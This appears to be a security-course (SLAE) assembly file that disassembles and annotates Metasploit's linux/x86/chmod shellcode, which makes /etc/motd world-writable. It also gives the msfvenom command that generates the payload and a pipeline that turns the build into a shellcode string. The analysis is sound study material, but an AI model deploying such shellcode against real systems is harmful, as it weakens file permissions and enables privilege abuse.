; Filename:      linux_x86_chmod.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  07.12.2018
; Note:          MSF: payload/linux/x86/chmod
; Disassembler:  msfvenom -p linux/x86/chmod FILE=/etc/motd MODE=666 -a x86 --platform linux -f raw | ndisasm -u - | cut -c 29-50
; Assembler:     nasm -f elf32 linux_x86_chmod.nasm -o linux_x86_chmod.o
; Linker:        ld -N -m elf_i386 linux_x86_chmod.o -o linux_x86_chmod
; Assembly dump: objdump -d ./linux_x86_chmod|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


global _start

section .text

_start:

cdq                            ; Convert Doubleword to Quadword (Clear edx register)
push byte +0xf                 ; 0x0000000f = 15 (sys_chmod)
pop eax                        ; eax = 15 = sys
push edx                       ; 0x00000000 = 0 to stack
call 0x14                      ; Set EIP at the end of the string (9 Bytes) and push the return address to the stack
das                            ; "/"
gs jz 0x71                     ; "etc"
das                            ; ...
insd                           ; ...
outsd                          ; ...
jz 0x77                        ; "td"
add [ebx+0x68],bl              ; x00 end string, x5b,x68 = pop ebx
mov dh,0x1                     ; Wrong translation from disassembler due to our string after the call instruction
add [eax],al                   ;
pop ecx
int 0x80
push byte +0x1
pop eax
int 0x80

; chmod, fchmod, fchmodat - change permissions of a file
; http://man7.org/linux/man-pages/man2/chmod.2.html
; int chmod(const char *pathname, mode_t mode);

; pop    ebx                         ; ebx = pointer to string = pathname
; push   0x1b6                       ;
;	pop    ecx                         ; ecx = 0x1b6 = 438 = 666 oct = mode
;	int    0x80                        ; syscall sys_chmod

;	push   0x1                         ;
;	pop    eax                         ; eax = 1
;	int    0x80                        ; syscall sys_exit
